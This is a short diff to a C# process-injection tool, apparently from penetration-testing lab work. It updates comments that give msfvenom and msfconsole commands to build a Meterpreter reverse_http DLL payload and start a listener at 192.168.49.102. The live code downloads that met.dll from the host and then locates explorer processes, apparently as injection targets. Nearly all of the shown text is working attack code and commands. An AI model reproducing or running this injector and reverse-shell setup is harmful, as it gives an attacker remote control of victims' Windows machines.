@@ -33,8 +33,9 @@ namespace dll_process_injector
             String dllName = dir + "\\met.dll";
 
             WebClient wc = new WebClient();
-            // msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.49.102 LPORT=443 -f dll -o met.dll
-            // sudo msfconsole -q - x "use multi/handler; set payload windows/x64/meterpreter/reverse_https; set lhost 192.168.49.102; set lport 443; exploit"
+            // https payload doesn't work with the latest metasploit, use http instead
+            // msfvenom -p windows/x64/meterpreter/reverse_http LHOST=192.168.49.102 LPORT=443 -f dll -o met.dll
+            // sudo msfconsole -q - x "use multi/handler; set payload windows/x64/meterpreter/reverse_http; set lhost 192.168.49.102; set lport 443; exploit"
             wc.DownloadFile("http://192.168.49.102/met.dll", dllName);
 
             Process[] expProc = Process.GetProcessesByName("explorer");
